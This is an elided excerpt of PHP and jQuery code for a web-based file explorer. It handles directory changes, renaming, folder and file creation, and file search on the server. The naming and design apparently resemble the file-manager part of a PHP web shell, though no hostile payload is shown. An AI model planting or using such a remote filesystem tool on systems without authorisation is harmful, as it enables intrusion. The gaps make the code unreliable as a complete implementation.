...
if ($('#explorer #xplTable').length <= 0 && $('#explorer #viewFile').length <= 0) {
	$('#xplTable').remove();
	navigate(get_cwd());
}
xpl_bind();
...
if (isset($p['cd'])) {
	...
	$path = realpath($path);
	if (is_file($path)) {
		$path = FileManagerClass::get_parent_path($path);
	}
	...
	if (file_exists($renameFile)) {
		if (rename($renameFile, $renameFileTo)) {
			$res = FileManagerClass::get_parent_path($renameFileTo);
		} else {
			$res = "error";
		}
	...
	if (mkdir($newFolder)) {
		$res = FileManagerClass::get_parent_path($newFolder);
	} else {
		$res = "error";
	}
	...
	if (touch($newFile)) {
		$res = FileManagerClass::get_parent_path($newFile);
	} else {
		$res = "error";
	}
	...
	$candidate = FileManagerClass::get_all_files($findPath);
	if ($findType == 'file') {
